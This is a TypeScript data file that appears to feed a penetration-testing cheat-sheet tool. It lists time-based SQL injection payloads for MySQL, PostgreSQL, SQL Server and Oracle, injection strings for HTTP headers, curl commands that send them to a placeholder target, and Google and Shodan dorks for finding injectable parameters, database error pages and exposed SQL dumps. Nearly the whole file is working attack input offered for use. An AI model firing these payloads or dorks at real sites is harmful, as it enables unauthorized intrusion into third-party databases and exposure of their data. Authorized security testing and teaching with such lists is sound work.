import { CommandCategory } from '../../types';

// ============================================
// PAYLOADS & GOOGLE DORKS
// ============================================

export const payloadCategories: CommandCategory[] = [
    {
        id: 'sql-injection-payloads',
        title: 'SQL Injection Payloads',
        commands: [
            {
                name: 'MySQL Payloads',
                command: [
                    `SELECT SLEEP(10);`,
                    `0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
                    `1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(FLOOR(RAND()*2),(SELECT SLEEP(5))) AS x FROM information_schema.tables GROUP BY x) y);`,
                    `' OR IF(1=1, SLEEP(10), 0)-- -`
                ],
                description: 'MySQL time-based injection payloads.'
            },
            {
                name: 'PostgreSQL Payloads',
                command: [
                    `SELECT pg_sleep(10);`,
                    `' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < interval '0:0:10') THEN (SELECT '1' || pg_sleep(10)) ELSE '0' END)='1`,
                    `' OR 1=1; SELECT pg_sleep(5);--`,
                    `' OR (SELECT CASE WHEN (random() < 0.5) THEN pg_sleep(5) ELSE pg_sleep(0) END);--`
                ],
                description: 'PostgreSQL time-based injection payloads.'
            },
            {
                name: 'SQL Server Payloads',
                command: [
                    `WAITFOR DELAY '00:00:10';`,
                    `'; WAITFOR DELAY '00:00:05'; --`,
                    `IF (1=1) WAITFOR DELAY '0:0:10';`,
                    `'; IF EXISTS (SELECT * FROM users) WAITFOR DELAY '00:00:07';--`
                ],
                description: 'SQL Server time-based injection payloads.'
            },
            {
                name: 'Oracle Payloads',
                command: [
                    `BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;`,
                    `' OR 1=1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;--`,
                    `DECLARE v INTEGER; BEGIN IF 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END IF; END;`
                ],
                description: 'Oracle time-based injection payloads.'
            },
            {
                name: 'Combined MySQL and MSSQL',
                command: [`1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--`],
                description: 'Combined MySQL and MSSQL payload.'
            },
            {
                name: 'MySQL Multi-condition Bypass',
                command: [`if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/`],
                description: 'MySQL multi-condition time-based payload with comment bypass.'
            }
        ]
    },
    {
        id: 'header-sqli-testing',
        title: 'Header-Based SQLi Testing',
        commands: [
            {
                name: 'Header Payloads',
                command: [
                    `User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
                    `X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
                    `Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'"`
                ],
                description: 'SQL injection payloads for HTTP headers.'
            },
            {
                name: 'Curl Header Testing',
                command: [
                    `time curl -s -H "User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"`,
                    `time curl -s -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"`,
                    `time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\\"" "https://target.com/vulnerable-endpoint"`
                ],
                description: 'Using curl to confirm time delays.'
            },
            {
                name: 'URL Parameter Testing',
                command: [
                    `time curl "https://target.com/page.php?id=if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/"`
                ],
                description: 'URL parameter-based time delay testing.'
            }
        ]
    },
    {
        id: 'google-dorks',
        title: 'Google Dorks',
        commands: [
            {
                name: 'By Parameters in URL',
                command: [
                    `site:*.example.com inurl:id=`,
                    `site:*.example.com inurl=product.php?id=`,
                    `site:*.example.com inurl=view.php?page=`,
                    `site:*.example.com inurl=item.php?cat=`
                ],
                description: 'Google dorks for finding URL parameters.'
            },
            {
                name: 'By File Extension',
                command: [
                    `site:*.example.com ext:php`,
                    `site:*.example.com ext:asp`,
                    `site:*.example.com ext:aspx`,
                    `site:*.example.com ext:jsp`,
                    `site:*.example.com ext:jspx`,
                    `site:*.example.com ext:cfm`,
                    `site:*.example.com ext:pl`
                ],
                description: 'Google dorks for file extensions.'
            },
            {
                name: 'Extension + Parameters',
                command: [
                    `site:*.example.com ext:php inurl:id=`,
                    `site:*.example.com ext:aspx inurl=productid=`,
                    `site:*.example.com ext:jsp inurl=categoryid=`
                ],
                description: 'Combined extension and parameter dorks.'
            },
            {
                name: 'MySQL Errors',
                command: [
                    `site:*.example.com intext:"You have an error in your SQL syntax"`,
                    `site:*.example.com intext:"mysql_fetch_array() expects parameter"`,
                    `site:*.example.com intext:"mysql_num_rows() expects parameter"`,
                    `site:*.example.com intext:"supplied argument is not a valid MySQL result resource"`,
                    `site:*.example.com intext:"Warning: mysql_"`,
                    `site:*.example.com intext:"Fatal error: Uncaught mysqli_sql_exception"`
                ],
                description: 'Google dorks for MySQL error messages.'
            },
            {
                name: 'MariaDB / PDO Errors',
                command: [
                    `site:*.example.com intext:"Fatal error: Call to undefined function mysql_connect()"`,
                    `site:*.example.com intext:"Warning: PDO::query()"`,
                    `site:*.example.com intext:"SQLSTATE[HY000]"`
                ],
                description: 'Google dorks for MariaDB/PDO errors.'
            },
            {
                name: 'PostgreSQL Errors',
                command: [
                    `site:*.example.com intext:"pg_query(): Query failed"`,
                    `site:*.example.com intext:"Warning: pg_connect()"`,
                    `site:*.example.com intext:"PostgreSQL query failed: ERROR"`
                ],
                description: 'Google dorks for PostgreSQL errors.'
            },
            {
                name: 'SQL Server Errors',
                command: [
                    `site:*.example.com intext:"Microsoft OLE DB Provider for SQL Server"`,
                    `site:*.example.com intext:"Unclosed quotation mark after the character string"`,
                    `site:*.example.com intext:"ADODB.Field error"`,
                    `site:*.example.com intext:"80040e14"`
                ],
                description: 'Google dorks for SQL Server errors.'
            },
            {
                name: 'Oracle DB Errors',
                command: [
                    `site:*.example.com intext:"ORA-00933: SQL command not properly ended"`,
                    `site:*.example.com intext:"ORA-01756: quoted string not properly terminated"`,
                    `site:*.example.com intext:"Warning: oci_parse()"`
                ],
                description: 'Google dorks for Oracle errors.'
            },
            {
                name: 'Generic SQL Errors',
                command: [
                    `site:*.example.com intext:"Query failed:"`,
                    `site:*.example.com intext:"unexpected end of SQL command"`,
                    `site:*.example.com intext:"invalid SQL statement"`,
                    `site:*.example.com intext:"JDBC Exception"`
                ],
                description: 'Google dorks for generic SQL errors.'
            },
            {
                name: 'Exposed Database Dumps',
                command: [
                    `site:example.com ext:sql | ext:db | ext:dbf | ext:bak | ext:old | ext:backup`,
                    `intitle:"index of" "db.sql"`,
                    `intitle:"index of" "database.sql"`,
                    `intitle:"index of" "dump.sql"`
                ],
                description: 'Google dorks for exposed database files.'
            },
            {
                name: 'Shodan Dork',
                command: [`Ssl.cert.subject.CN:'example.com' 200`],
                description: 'Shodan dork for SSL certificate search.'
            }
        ]
    }
];
